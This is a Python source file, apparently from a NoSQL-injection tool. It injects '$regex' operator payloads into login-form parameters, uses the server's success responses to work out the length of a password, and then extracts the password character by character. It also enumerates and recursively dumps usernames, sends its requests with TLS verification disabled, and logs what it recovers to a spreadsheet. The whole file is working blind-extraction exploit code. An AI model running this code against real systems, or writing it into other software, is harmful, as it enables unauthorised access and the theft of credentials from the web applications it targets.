from requests_html import HTMLSession
from termcolor import colored
import requests
import urllib3
import urllib
import time
from _helper import *

def dumpKnownValue(nsi, form_data, password):
    start_time_length = time.time()
    total_time_length = 0
    # alphabet = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits) + list(string.punctuation)
    # count length
    for c in range(0, 9999999):
        # for element in form_data:
        #     if "$regex" in element:
        #         form_data[element] = "^.{" + str(c) + "}$"
        Str.iterateParam(form_data, "^.{"+str(c)+"}$")
        # r = requests.post(nsi.url, data=form_data, verify=False)
        if (nsi.reqMethod == '2'):
            r = requests.post(nsi.url, data=form_data, verify=False)
        else:
            r = requests.get(nsi.url, params=form_data, verify=False)

        if nsi.successIdentifier in r.text:
            end_time = time.time()
            time_taken = end_time - start_time_length
            print("Found length : %s" % (c))
            length = c
            total_time_length += time_taken
            break
    if (not nsi.isSilent):
        print(colored(f"Time taken length for {length}: {total_time_length}", "yellow", attrs=["blink"]))
    # print("============================================\n")
    
    start_time_char = time.time()
    total_time_char = []
    for x in range(length):
        # for c in alphabet:
        for c in range(0x20, 0x7f):
            c = chr(c) # returns the character that represents the specified unicode.
            if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " ", '(', ')' , '^', '\\', '[', ']']:
                # form_data = {}
                # for element in form_data:
                #     if "$regex" in element:
                #         form_data[element] = f"^{urllib.parse.quote_plus(password+c)}"
                Str.iterateParam(form_data, f"^{(password+c)}")
                if (nsi.reqMethod == '2'):
                    r = requests.post(nsi.url, data=form_data, verify=False)
                else:
                    r = requests.get(nsi.url, params=form_data, verify=False)

                if nsi.successIdentifier in r.text:
                    end_time = time.time()
                    time_taken = end_time - start_time_char
                    print("Result : %s" % (password + c), end="\r")
                    password += c
                    if (not nsi.isSilent):
                        print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
                    total_time_char.append(time_taken)
                    start_time_char = time.time()
                    break
                
    print("Total Time: " + str(sum(total_time_char)))
    print("Result : %s" % (password))
    
    # Log to CSV
    Report.writeExcel(nsi, password, True)

def getPrefix(nsi, form_data):
    prefixUsernames = []
    alphabet = range(0x20, 0x7f)
    # alphabet = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits) + list(string.punctuation)
    start_time = time.time()
    total_time = 0
    timesPrefix = []
    
    for c in alphabet:
        c = chr(c)
        if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " ", '(', ')' , '^', '\\', '[', ']']:
            # for element in form_data:
            #     if "$regex" in element:
            #         form_data[element] = "^" + str(c) + ".*"
            Str.iterateParam(form_data, "^" + str(c) + ".*")
            r = requests.post(nsi.url, data=form_data, verify=False)
            if nsi.successIdentifier in r.text:
                end_time = time.time()
                time_taken = end_time - start_time
                total_time += time_taken
                prefixUsernames.append(c)
                timesPrefix.append({
                    c: time_taken
                })
                if (not nsi.isSilent):
                    print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))

    print(colored(f"Total time get username prefixes: {total_time}", "yellow", attrs=["blink"]))
    # print(timesPrefix)
    for username in prefixUsernames:
        dumpData(nsi, username, form_data)


# recursive
def dumpData(nsi, username, form_data, total_time = 0):
    # alphabet = list(string.ascii_letters) + list(string.digits)
    alphabet = range(0x20, 0x7f)
    # alphabet = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits) + list(string.punctuation)
    
    updated_form_data = {}
    start_time = time.time()

    # print(username)
    for element in form_data:
        if "$regex" in element:
            element = element.replace("[$regex]", "")
            updated_form_data[element] = username
        else:
            updated_form_data[element] = form_data[element]
        r = requests.post(nsi.url, data=updated_form_data, verify=False)
        if nsi.successIdentifier in r.text:
            print(f"Result: {username} | Total Time: {total_time}")
            # Log to CSV
            Report.writeExcel(nsi, username, False)
            # return
            # start_time = time.time()
            # total_time = 0
    
    # while True:
    # for x in range(2):
    for c in alphabet:
        c = chr(c)
        if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " ", '(', ')' , '^', '\\', '[', ']', '$']:
            Str.iterateParam(form_data, "^" + str(username + c) + ".*")
            # print("TRIGERRED" + username)
            r = requests.post(nsi.url, data=form_data, verify=False)

            if nsi.successIdentifier in r.text:
                end_time = time.time()
                time_taken = end_time - start_time
                total_time += time_taken
                
                if (not nsi.isSilent):
                    print(colored(f"Time taken for append {c}: {time_taken}", "yellow", attrs=["blink"]))
                    
                start_time = time.time()
                dumpData(nsi, username + c, form_data, total_time)
                total_time = 0

            if c == chr(alphabet[-1]):
                # print(chr(alphabet[-1]) + "canaryEndofAlph")
                return